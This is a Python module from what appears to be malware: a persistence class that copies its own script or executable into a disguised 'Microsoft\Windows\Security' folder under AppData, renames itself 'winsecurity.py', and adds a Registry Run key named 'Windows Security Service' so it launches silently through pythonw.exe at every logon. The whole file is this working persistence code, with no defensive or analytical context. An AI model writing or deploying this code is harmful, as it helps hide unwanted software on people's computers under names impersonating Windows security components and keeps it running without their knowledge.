import os
import platform
import shutil
import winreg
import sys

class PersistenceService:
    """Handles platform-specific persistence mechanisms."""

    def make_persistent_windows(self) -> tuple[bool, str]:
        """
        Establishes persistence on Windows by copying the script and adding a Run key.
        Returns a tuple: (success_boolean, message).
        """
        if platform.system() != "Windows":
            return False, "Persistence is only supported on Windows."

        try:
            # Determine the correct path of the running executable or script
            if getattr(sys, 'frozen', False):
                # Running as a compiled executable (e.g., PyInstaller)
                script_path = sys.executable
                dest_filename = os.path.basename(script_path)
            else:
                # Running as a .py script
                script_path = os.path.realpath(__file__)
                dest_filename = 'winsecurity.py'

            dest_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Security')
            os.makedirs(dest_folder, exist_ok=True)
            
            dest_path = os.path.join(dest_folder, dest_filename)
            shutil.copyfile(script_path, dest_path)
            
            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            # Use pythonw.exe for silent execution if running as a script
            run_command = f'"{dest_path}"'
            if not getattr(sys, 'frozen', False):
                run_command = f'pythonw.exe {run_command}'
                
            winreg.SetValueEx(key, 'Windows Security Service', 0, winreg.REG_SZ, run_command)
            winreg.CloseKey(key)
            
            return True, f"Persistence established successfully at '{dest_path}'."
        except Exception as e:
            return False, f"[Error] Failed to establish persistence: {e}"